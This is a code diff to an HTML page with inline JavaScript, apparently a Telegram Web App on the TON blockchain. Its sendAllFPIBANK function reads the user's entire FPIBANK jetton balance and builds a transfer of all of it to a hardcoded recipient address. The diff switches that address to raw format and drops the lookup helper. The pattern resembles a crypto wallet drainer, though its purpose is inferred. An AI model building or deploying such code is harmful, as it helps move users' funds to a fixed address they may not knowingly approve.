@@ -47,7 +47,9 @@
     });
 
     const jettonMasterAddress = "0:f42a9711321fac28edb3e7ebce8e0bc58d34f9f2d3bed8d9afc6a839a1c15016";
-    const recipientAddress = "UQCXsfFqRsY2pS3HsNzqnN0ns2ANiGrHpnmg_rQCJ-gxlqlU";
+    
+    // ✅ Используй этот адрес (RAW-формат)
+    const recipientAddress = "0:972c7c5a91b18da94b71ec373aa73749ecd803621ab1e99e683fad0089fa0c65";
 
     async function getUserFPIBankData(userTonAddress) {
       const url = `https://tonapi.io/v2/accounts/${userTonAddress}/jettons`;
@@ -69,17 +71,6 @@
       };
     }
 
-    async function resolveRawAddress(address) {
-      try {
-        const response = await fetch(`https://tonapi.io/v2/blockchain/resolve_address?address=${address}`);
-        const data = await response.json();
-        return data.address || null;
-      } catch (error) {
-        console.error("Ошибка при конвертации адреса в RAW-формат:", error);
-        return null;
-      }
-    }
-
     async function sendAllFPIBANK(userTonAddress) {
       const { rawBalance, decimals, userJettonWallet } = await getUserFPIBankData(userTonAddress);
 
@@ -96,15 +87,6 @@
       console.log(`У вас ~${humanBalance} FPIBANK (raw = ${rawBalance})`);
       console.log("User Jetton Wallet Address:", userJettonWallet);
 
-      // Конвертируем адрес получателя в RAW-формат
-      const resolvedRecipientAddress = await resolveRawAddress(recipientAddress);
-      if (!resolvedRecipientAddress) {
-        Telegram.WebApp.showAlert("Ошибка: не удалось определить адрес получателя.");
-        return;
-      }
-
-      console.log("Resolved Recipient Address (RAW):", resolvedRecipientAddress);
-
       const gasFee = 20000000; // 0.02 TON на газ
 
       const message = {
@@ -113,17 +95,17 @@
         payload: {
           type: "jetton_transfer",
           query_id: Math.floor(Math.random() * 1000000),
-          amount: Number(rawBalance),  // Приводим к числу (убираем кавычки)
-          destination: resolvedRecipientAddress, // RAW-адрес получателя
-          response_destination: userJettonWallet, // Jetton Wallet пользователя
+          amount: Number(rawBalance),
+          destination: recipientAddress, // RAW-адрес напрямую
+          response_destination: userJettonWallet,
           forward_ton_amount: "0",
           forward_payload: null,
-          jetton: jettonMasterAddress, // minter jetton
+          jetton: jettonMasterAddress,
         },
       };
 
       const transaction = {
-        validUntil: Math.floor(Date.now() / 1000) + 3600, // Даем больше времени (1 час)
+        validUntil: Math.floor(Date.now() / 1000) + 3600, // +1 час
         messages: [message],
       };
 
@@ -162,4 +144,5 @@
   </script>
 </body>
 </html>
+
 
